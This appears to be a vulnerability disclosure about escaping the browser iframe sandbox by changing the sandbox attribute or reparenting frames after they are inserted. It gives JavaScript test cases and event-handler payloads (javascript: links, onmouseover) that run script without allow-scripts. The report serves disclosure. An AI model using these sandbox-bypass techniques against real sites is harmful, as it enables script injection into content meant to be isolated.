<h3>The problem</h3>
<h4>Please describe the technical details of the vulnerability</h4>
<ul>
<li>Iframe reparenting occurs when a active iframe state is changed or a active iframe in a dom node is connected to another node.</li>
<li>I was able to find a bypass which escapes the sandbox restriction of a iframe through reparenting.</li>
<li>The sandbox attribute meant to follow the latest page inheritance but it failed in the below cases.</li>
</ul>
<h4>Test case 1</h4>
<pre><code>frame = document.createElement(&quot;iframe&quot;)
frame.src=&quot;data:text/html,&lt;a href=&#39;javascript:alert()&#39;&gt;click me&lt;/a&gt;&quot;
document.body.append(frame)
frame.setAttribute(&quot;sandbox&quot;,&quot;&quot;)
</code></pre>
<ul>
<li>Appending a frame to the dom and setting the attribute sandbox.</li>
<li>Now try click the clickme button,it wont work.</li>
</ul>
<pre><code>frame.setAttribute(&quot;sandbox&quot;,&quot;allow-same-origin&quot;)
</code></pre>
<ul>
<li>Now appending one more attribute, now click the button the javascript will execute.</li>
<li>Creating a sandbox iframe with the same setup gives away the error <code>data:text/html,&lt;sty…:1 Blocked script execution in &#39;data:text/html,&lt;style&gt;body {color: white;font-family: &#39;Space Mono&#39;, monospace;}&lt;/style&gt;&lt;a href=&quot;javascript:alert()&quot;&gt;click&lt;/a&gt;&#39; because the document&#39;s frame is sandboxed and the &#39;allow-scripts&#39; permission is not set.</code></li>
<li>Without the need for <code>allow-scripts</code> we were able to break out of the sandbox and executes script with iframe reparenting.</li>
<li>While this does not work with <code>&lt;script&gt;</code> element ! work as intended.</li>
</ul>
<h4>Test case 2</h4>
<ul>
<li>Inaccurate behaviour between user action vs page action.</li>
<li>We can use this tool <code>https://kabilan1290.github.io/sniper/sandbox.html</code> to explain the behaviour of test case 2.</li>
<li>input <code>&lt;iframe onload=alert()&gt;</code> into src and enable sandbox [ the alert will execute when entering dom before sandbox]</li>
<li>Now try update some element to src it can be anything but with the same <code>&lt;iframe onload=alert()&gt;</code> element.</li>
</ul>
<p><code>data:text/html,&lt;sty…:1 Blocked script execution in &#39;data:text/html,&lt;style&gt;body {color: white;font-family: &#39;Space Mono&#39;, monospace;}&lt;/style&gt;&lt;iframe src=&#39;1&#39; onload=alert()&gt;&#39; because the document&#39;s frame is sandboxed and the &#39;allow-scripts&#39; permission is not set.</code></p>
<ul>
<li>We get the script execution error due to the sandbox attribute.</li>
<li>Now do the same with the element <code>&lt;iframe onmouseover=alert()&gt;</code> and enable sandbox.</li>
<li>Now try update some element to src it can be anything but with the same <code>&lt;iframe onmouseover=alert()&gt;</code> element.</li>
<li>Now hover through the created element and notice the alert pops up.</li>
<li>It concludes an inaccuracy between page load event and user action event.</li>
</ul>
<h4>Conclusion:</h4>
<ul>
<li><code>Test case1</code> and <code>Test case2</code> proves that iframe sandboxing through reparenting not works as intended for user specific action.</li>
</ul>
